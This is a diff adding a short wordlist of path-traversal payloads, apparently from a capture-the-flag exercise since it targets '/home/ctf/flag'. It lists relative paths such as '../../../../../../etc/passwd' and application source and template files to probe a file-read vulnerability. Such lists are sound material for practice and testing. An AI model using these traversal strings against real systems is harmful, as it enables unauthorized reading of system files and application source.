@@ -1,0 +1,11 @@
+/etc/passwd
+../../../../../../etc/passwd
+main.py
+main.go
+../../../../../../app/main.py
+../../../../../../app/main.go
+../../../../../../app/tpl/main.py
+../../../../../../app/tpl/main.go
+../../../../../../home/ctf/flag
+../../../../../../app/index.html
+../../../../../../app/tpl/index.html
